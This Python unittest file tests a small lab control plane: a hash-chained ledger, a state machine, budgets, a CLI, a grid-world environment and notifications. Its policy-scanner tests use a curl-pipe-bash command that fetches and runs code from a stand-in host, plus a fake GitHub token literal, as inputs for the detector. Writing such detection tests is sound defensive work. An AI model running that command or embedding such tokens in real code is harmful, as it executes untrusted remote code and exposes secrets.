"""控制面测试：不需要网络、GPU、Docker，也不需要第三方包。

跑法： python -m unittest discover -s tests -v
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from lab import __version__  # noqa: E402
from lab.budget import Budget, BudgetExceeded  # noqa: E402
from lab.cli import _episode_records  # noqa: F401  私有函数，测试里用于确定性断言
from lab.cli import main as cli_main  # noqa: E402
from lab.clock import Clock, FakeClock, elapsed_seconds, parse_iso, to_iso  # noqa: E402
from lab.env import GridWorld, greedy_action  # noqa: E402
from lab.notify import Notifier  # noqa: E402
from lab.predict import Linear, Persistence, benchmark, error, sparkline  # noqa: E402
from lab.ledger import Ledger  # noqa: E402
from lab.policy import scan, scan_text, summarize  # noqa: E402
from lab.state import IllegalTransition, StateStore  # noqa: E402


class ClockTests(unittest.TestCase):
    def test_naive_datetime_rejected(self) -> None:
        import datetime as dt

        with self.assertRaises(ValueError):
            to_iso(dt.datetime(2026, 1, 1, 0, 0, 0))

    def test_roundtrip(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T12:30:55Z")), "2026-11-04T12:30:55Z")

    def test_offset_input_normalised_to_utc(self) -> None:
        self.assertEqual(to_iso(parse_iso("2026-11-04T20:30:55+08:00")), "2026-11-04T12:30:55Z")

    def test_fake_clock_advances_and_is_monotonic(self) -> None:
        clock = FakeClock("2026-01-01T00:00:00Z")
        clock.advance(90)
        self.assertEqual(clock.now_iso(), "2026-01-01T00:01:30Z")
        self.assertEqual(elapsed_seconds(0, clock.monotonic_ns()), 90.0)

    def test_negative_elapsed_rejected(self) -> None:
        with self.assertRaises(ValueError):
            elapsed_seconds(10, 5)

    def test_real_clock_is_aware(self) -> None:
        self.assertIsNotNone(Clock().now().tzinfo)


class LedgerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "ledger.jsonl"
        self.ledger = Ledger(self.path)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_append_and_verify(self) -> None:
        for index in range(3):
            self.ledger.append("step", {"step": index}, "2026-01-01T00:00:0%dZ" % index)
        ok, detail = self.ledger.verify()
        self.assertTrue(ok, detail)
        self.assertEqual(self.ledger.last()["seq"], 3)

    def test_tampering_breaks_chain(self) -> None:
        self.ledger.append("step", {"step": 1}, "2026-01-01T00:00:00Z")
        self.ledger.append("step", {"step": 2}, "2026-01-01T00:00:01Z")
        lines = self.path.read_text(encoding="utf-8").splitlines()
        records = [json.loads(line) for line in lines]
        records[0]["payload"]["step"] = 99
        self.path.write_text(
            "\n".join(json.dumps(r, ensure_ascii=False, sort_keys=True, separators=(",", ":")) for r in records) + "\n",
            encoding="utf-8",
        )
        ok, detail = self.ledger.verify()
        self.assertFalse(ok)
        self.assertIn("改", detail)

    def test_empty_ledger_is_valid(self) -> None:
        ok, _ = self.ledger.verify()
        self.assertTrue(ok)


class StateTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.store = StateStore(Path(self.tmp.name) / "state.json")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_legal_path(self) -> None:
        ts = "2026-01-01T00:00:00Z"
        for target in ("READY", "RUNNING", "REVIEWING", "RUNNING", "ROLLING_BACK", "READY"):
            self.store.transition(target, ts=ts, reason="test")
        self.assertEqual(self.store.status(), "READY")
        ok, detail = self.store.verify_history()
        self.assertTrue(ok, detail)

    def test_illegal_transition_rejected(self) -> None:
        with self.assertRaises(IllegalTransition):
            self.store.transition("RUNNING", ts="2026-01-01T00:00:00Z")

    def test_archive_is_terminal(self) -> None:
        self.store.transition("ARCHIVED", ts="2026-01-01T00:00:00Z")
        with self.assertRaises(IllegalTransition):
            self.store.transition("READY", ts="2026-01-01T00:00:00Z")

    def test_hand_edited_file_detected(self) -> None:
        self.store.transition("READY", ts="2026-01-01T00:00:00Z")
        data = json.loads(Path(self.store.path).read_text(encoding="utf-8"))
        data["status"] = "RUNNING"
        Path(self.store.path).write_text(json.dumps(data), encoding="utf-8")
        ok, detail = self.store.verify_history()
        self.assertFalse(ok, detail)


class BudgetTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.ledger = Ledger(Path(self.tmp.name) / "ledger.jsonl")

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_charge_within_cap(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 3)
        self.assertEqual(budget.used("steps_per_run"), 3)
        budget.check("steps_per_run", 2)

    def test_exceed_raises(self) -> None:
        budget = Budget({"steps_per_run": 5}, self.ledger, "2026-01-01T00:00:00Z", run_id="run-001")
        budget.charge("steps_per_run", 5)
        with self.assertRaises(BudgetExceeded):
            budget.charge("steps_per_run", 1)

    def test_unknown_kind_rejected(self) -> None:
        budget = Budget(None, self.ledger, "2026-01-01T00:00:00Z")
        with self.assertRaises(KeyError):
            budget.charge("unicorn_hours", 1)


class PolicyTests(unittest.TestCase):
    def test_detects_remote_pipe_exec(self) -> None:
        findings = scan_text('bash -c "$(curl -s http://example.com/x | bash)"', path="bad.sh")
        self.assertTrue(any(f.rule == "remote-pipe-exec" for f in findings))

    def test_detects_secret_literal(self) -> None:
        findings = scan_text('TOKEN = "ghp_' + "a" * 24 + '"', path="leak.py")
        self.assertTrue(any(f.rule == "secret-literal" for f in findings))

    def test_clean_line_has_no_findings(self) -> None:
        self.assertEqual(scan_text('print("hello")', path="ok.py"), [])

    def test_repo_is_clean(self) -> None:
        high, medium = summarize(scan(REPO))
        self.assertEqual((high, medium), (0, 0), msg=f"仓库自身触发红线：{scan(REPO)}")


class CliTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.now = ["--fake-now", "2026-01-01T00:00:00Z"]

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def _run(self, *args: str, expect: int = 0) -> int:
        code = cli_main(["--root", str(self.root), *self.now, *args])
        self.assertEqual(code, expect, msg=f"命令 {args} 退出码 {code}，期望 {expect}")
        return code

    def test_full_happy_path(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("verify")
        self._run("viz")
        self._run("report")
        status = (self.root / "viz" / "status.md").read_text(encoding="utf-8")
        self.assertIn("READY", status)
        reports = list((self.root / "state" / "reports").glob("weekly-*.md"))
        self.assertEqual(len(reports), 1)
        self.assertTrue((self.root / "state" / "checkpoints").exists())

    def test_bench_writes_report_and_ledger(self) -> None:
        self._run("init")
        self._run("bench", "--steps", "20", "--seeds", "2")
        reports = list((self.root / "state" / "reports").glob("bench-*.md"))
        self.assertEqual(len(reports), 1)
        text = reports[0].read_text(encoding="utf-8")
        self.assertIn("预测基线对比", text)
        self.assertIn("persistence", text)
        ledger = (self.root / "state" / "ledger.jsonl").read_text(encoding="utf-8")
        self.assertIn('"bench"', ledger)

    def test_budget_exceeded_rolls_back(self) -> None:
        (self.root / "lab.config.json").write_text(
            json.dumps({"version": 1, "budget": {"steps_per_run": 3}}), encoding="utf-8"
        )
        self._run("init")
        self._run("run", "--steps", "10", expect=3)
        state = json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))
        self.assertEqual(state["status"], "READY")
        self.assertIn("ROLLING_BACK", [h["to"] for h in state["history"]])
        self._run("verify")

    def test_freeze_blocks_run_then_unfreeze(self) -> None:
        self._run("init")
        self._run("run", "--steps", "2")
        self._run("freeze", "--reason", "手动测试")
        self._run("run", "--steps", "2", expect=1)
        self._run("unfreeze", "--by", "tester")
        self._run("run", "--steps", "2")

    def test_unfreeze_requires_actor(self) -> None:
        self._run("init")
        self._run("freeze")
        self._run("unfreeze", expect=2)

    def test_bad_config_is_rejected(self) -> None:
        (self.root / "lab.config.json").write_text(json.dumps({"version": 7}), encoding="utf-8")
        self._run("init", expect=2)


class EnvTests(unittest.TestCase):
    """Issue 0001：8×8 网格环境。"""

    def test_episode_is_deterministic(self) -> None:
        first = _episode_records(20261104, 15)
        second = _episode_records(20261104, 15)
        self.assertEqual(first, second)
        self.assertEqual(len(first), 15)

    def test_different_seed_differs(self) -> None:
        self.assertNotEqual(_episode_records(1, 10), _episode_records(2, 10))

    def test_wall_blocks_movement(self) -> None:
        env = GridWorld(11)
        wall = sorted(env.walls)[0]
        # 站在墙左边（能站的话），向右撞墙
        env.agent = (wall[0] - 1, wall[1])
        if env.agent[0] < 0 or env.agent in env.walls:
            env.agent = (wall[0] + 1, wall[1])
            action = "left"
        else:
            action = "right"
        before = env.agent
        outcome = env.step(action)
        self.assertTrue(outcome["blocked"])
        self.assertEqual(env.agent, before)

    def test_energy_decreases_when_no_food(self) -> None:
        env = GridWorld(5)
        env.food = set()
        start_energy = env.energy
        for _ in range(40):          # 每步 -0.02，40 步后能量 0.2，低于 0.30 的舒适区
            env.step("rest")
        self.assertLess(env.energy, start_energy)
        self.assertGreater(env.homeostatic_error(), 0.0)

    def test_eating_restores_energy(self) -> None:
        env = GridWorld(5)
        target = sorted(env.food)[0]
        env.agent = target
        env.energy = 0.5
        outcome = env.step("rest")
        self.assertTrue(outcome["ate"])
        self.assertGreater(env.energy, 0.5)

    def test_hazard_accumulates_damage(self) -> None:
        env = GridWorld(5)
        env.agent = sorted(env.hazards)[0]
        for _ in range(3):           # 每次 +0.25；超过 0.50 才产生稳态误差
            outcome = env.step("rest")
            self.assertTrue(outcome["hurt"])
        self.assertGreater(env.damage, 0.5)
        self.assertGreater(env.homeostatic_error(), 0.0)

    def test_baseline_reaches_food(self) -> None:
        env = GridWorld(20261104)
        before = len(env.food)
        for _ in range(20):
            env.step(greedy_action(env))
        self.assertLess(len(env.food), before, "20 步内基线策略至少要吃到一份食物")

    def test_records_carry_real_state(self) -> None:
        record = _episode_records(7, 3)[-1]
        for key in ("step", "action", "x", "y", "energy", "damage", "homeostatic_error", "prediction_error"):
            self.assertIn(key, record)
        self.assertGreaterEqual(record["energy"], 0.0)
        self.assertLessEqual(record["energy"], 1.0)


class PredictTests(unittest.TestCase):
    """Issue 0003：预测基线对比。"""

    @staticmethod
    def _obs(x: float, y: float = 0.0, energy: float = 1.0, damage: float = 0.0) -> dict:
        return {"x": x, "y": y, "energy": energy, "damage": damage}

    def test_persistence_is_exact_on_static_series(self) -> None:
        predictor = Persistence()
        observation = self._obs(3)
        self.assertEqual(error(predictor.predict(observation), observation), 0.0)

    def test_linear_beats_persistence_on_constant_velocity(self) -> None:
        persistence = Persistence()
        linear = Linear()
        persistence_total = 0.0
        linear_total = 0.0
        previous = self._obs(0.0)
        for step in range(1, 6):
            actual = self._obs(float(step))
            persistence_total += error(persistence.predict(previous), actual)
            linear_total += error(linear.predict(previous), actual)
            persistence.update(actual)
            linear.update(actual)
            previous = actual
        # 第一步没有历史速度可用，必然错一次；之后应完美跟随
        self.assertLess(linear_total, persistence_total)
        self.assertLessEqual(linear_total, 0.25)
        self.assertAlmostEqual(linear_total, 0.25, places=6)

    def test_benchmark_is_deterministic(self) -> None:
        first = benchmark(steps=30, seeds=(1, 2))
        second = benchmark(steps=30, seeds=(1, 2))
        self.assertEqual(first["mean"], second["mean"])
        self.assertEqual(first["samples"], 60)

    def test_random_is_worse_than_persistence(self) -> None:
        summary = benchmark(steps=40, seeds=(3,))
        means = summary["mean"]
        self.assertGreater(means["random"], means["persistence"])

    def test_sparkline_shapes(self) -> None:
        self.assertEqual(len(sparkline([0.1, 0.2, 0.3])), 3)
        self.assertEqual(len(sparkline(list(range(200)), width=20)), 20)
        self.assertEqual(sparkline([]), "")


class NotifyTests(unittest.TestCase):
    """Issue 0019：通知分级 / 去重 / 回应 / 回应率。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.state = self.root / "state"
        self.ledger = Ledger(self.state / "ledger.jsonl")
        self.clock = FakeClock("2026-01-01T00:00:00Z")
        self.notifier = Notifier(self.ledger, self.clock, self.state, echo=False)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_emit_appends_ledger_and_channel_file(self) -> None:
        record = self.notifier.emit("high", "budget", "超限了")
        self.assertIsNotNone(record)
        self.assertEqual(len(self.notifier._alerts()), 1)
        lines = (self.state / "notify.jsonl").read_text(encoding="utf-8").strip().splitlines()
        self.assertEqual(len(lines), 1)
        self.assertIn("超限了", lines[0])

    def test_dedupe_within_24h(self) -> None:
        first = self.notifier.emit("high", "budget", "第一次", dedupe_key="budget")
        second = self.notifier.emit("high", "budget", "第二次", dedupe_key="budget")
        self.assertIsNotNone(first)
        self.assertIsNone(second)
        self.assertEqual(len(self.notifier._alerts()), 1)

    def test_dedupe_expires_after_24h(self) -> None:
        self.notifier.emit("high", "drift", "第一次", dedupe_key="drift")
        self.clock.advance(25 * 3600)
        again = self.notifier.emit("high", "drift", "第二天", dedupe_key="drift")
        self.assertIsNotNone(again)
        self.assertEqual(len(self.notifier._alerts()), 2)

    def test_no_dedupe_key_means_always_send(self) -> None:
        self.notifier.emit("high", "freeze", "冻一次")
        self.notifier.emit("high", "freeze", "再冻一次")
        self.assertEqual(len(self.notifier._alerts()), 2)

    def test_ack_clears_pending_and_fixes_rate(self) -> None:
        record = self.notifier.emit("high", "budget", "超限", dedupe_key="b")
        self.assertEqual(len(self.notifier.pending()), 1)
        self.notifier.ack(int(record["seq"]), "freeze", by="tester")
        self.assertEqual(self.notifier.pending(), [])
        self.assertEqual(self.notifier.response_rate(), 1.0)

    def test_rate_below_threshold_emits_health_alert(self) -> None:
        # 少于 MIN_SAMPLE 条时不下结论
        self.notifier.emit("high", "drift", "只有一条", dedupe_key="solo")
        self.assertIsNone(self.notifier.check_health())
        for index in range(3):
            self.notifier.emit("high", "drift", f"第{index}条", dedupe_key=str(index))
        self.assertEqual(self.notifier.response_rate(), 0.0)
        health = self.notifier.check_health()
        self.assertIsNotNone(health)
        self.assertEqual(health["payload"]["kind"], "notify-health")
        # 同一天再查一次不应重复刷屏
        self.assertIsNone(self.notifier.check_health())

    def test_invalid_level_and_action_rejected(self) -> None:
        with self.assertRaises(ValueError):
            self.notifier.emit("urgent", "x", "y")
        record = self.notifier.emit("low", "x", "y")
        with self.assertRaises(ValueError):
            self.notifier.ack(int(record["seq"]), "explode")
        with self.assertRaises(KeyError):
            self.notifier.ack(99999, "pause")

    def test_cli_notify_ack_inbox(self) -> None:
        root = self.root
        args = ["--root", str(root), "--fake-now", "2026-01-01T00:00:00Z"]
        self.assertEqual(cli_main([*args, "init"]), 0)
        self.assertEqual(cli_main([*args, "notify", "--kind", "budget", "--message", "测试", "--dedupe-key", "k"]), 0)
        self.assertEqual(cli_main([*args, "notify", "--kind", "budget", "--message", "重复", "--dedupe-key", "k"]), 0)
        text = (root / "state" / "notify.jsonl").read_text(encoding="utf-8")
        self.assertEqual(len(text.strip().splitlines()), 1)
        seq = int(text.strip().splitlines()[0].split('"seq": ')[1].split(",")[0])
        self.assertEqual(cli_main([*args, "ack", str(seq), "--action", "pause"]), 0)
        self.assertEqual(cli_main([*args, "inbox"]), 0)
        self.assertEqual(cli_main([*args, "ack", "99999", "--action", "pause"]), 2)


class SubprocessSmokeTests(unittest.TestCase):
    """真实起一个进程，确认 `python -m lab.cli` 在这台机器上不报错。"""

    def test_doctor_in_repo(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "doctor"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)
        self.assertIn(__version__, result.stdout)

    def test_module_status(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "--root", str(REPO), "status"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)


if __name__ == "__main__":
    unittest.main()
